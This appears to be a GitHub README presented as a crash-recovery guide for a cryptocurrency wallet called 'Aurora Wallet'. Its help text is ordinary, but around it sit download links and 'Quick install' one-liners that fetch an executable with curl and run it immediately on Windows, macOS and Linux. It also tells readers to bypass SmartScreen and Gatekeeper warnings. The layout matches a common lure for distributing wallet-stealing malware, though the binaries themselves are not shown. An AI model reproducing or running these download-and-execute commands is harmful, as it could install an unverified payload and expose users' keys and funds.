![Aurora Wallet crash on launch guide](assets/aurora-wallet-guide-article-banner.png)

# Aurora Wallet crashes on launch: safe recovery steps

A window that opens and disappears is a startup problem, and the wallet file is almost never the cause.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


An application that closes before the main window appears has failed while reading its own data, and your keys are still intact.

The startup sequence loads the wallet file, opens the chain database and contacts peers. A crash at that point comes from a damaged database, a missing library, an incomplete installation or a lock left behind by a previous session that ended without a clean shutdown.

<!-- ARTICLE-BODY-BEGIN -->

## Protect the wallet file first

Copy the wallet file from the data directory to an external drive before you change anything. The recovery phrase restores the keys, and the file restores the labels and address book, so both deserve a backup before a repair begins.

The folder for each operating system is listed in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md">the wallet.dat location guide</a>. Copy, do not move, and do not overwrite an existing backup with a file of unknown state.

## Work through the launch

1. Start the wallet from a terminal or command prompt so the error text stays visible.
2. Check the free disk space; a full disk stops the database from opening.
3. Close any second copy of the application, including one left running in the tray.
4. If the window flashes, rename `blocks` and `chainstate` in the data directory and start again.
5. Reinstall the current build if the error mentions a missing library.
6. Restore the wallet file from your backup if the error names the wallet file itself.

Steps four and five solve almost every case. A rebuilt chain costs download time, not coins, because the wallet file is untouched by that repair.

## After the wallet opens again

Let the sync finish before sending anything, then confirm the version in the About window. A build that crashed repeatedly is usually the older one, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/09-update-aurora-wallet-safely.md">updating Aurora Wallet safely</a> replaces it without touching data.

If the crash returns with a rebuilt chain and a reinstalled program, the operating system is the remaining variable: check the graphics and desktop libraries the wallet needs, particularly on minimal Linux installations. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/20-linux-permissions.md">Linux permissions and launch errors</a> lists the package names.

Install from the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> so the rebuild and the binary come from the same version.

## FAQ

### Can a crash corrupt my keys?

The wallet writes the file carefully and a crash rarely damages it. Copy the file before repairs and the risk is negligible.

### Should I delete the data directory to fix a crash?

No. Rename the chain folders instead. Deleting the directory takes the wallet file with it.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [wallet.dat location](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/21-wallet-dat-location.md)
- [Wallet not syncing](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/11-wallet-not-syncing.md)
- [Update Aurora Wallet safely](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/09-update-aurora-wallet-safely.md)
- [Linux permissions](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/20-linux-permissions.md)
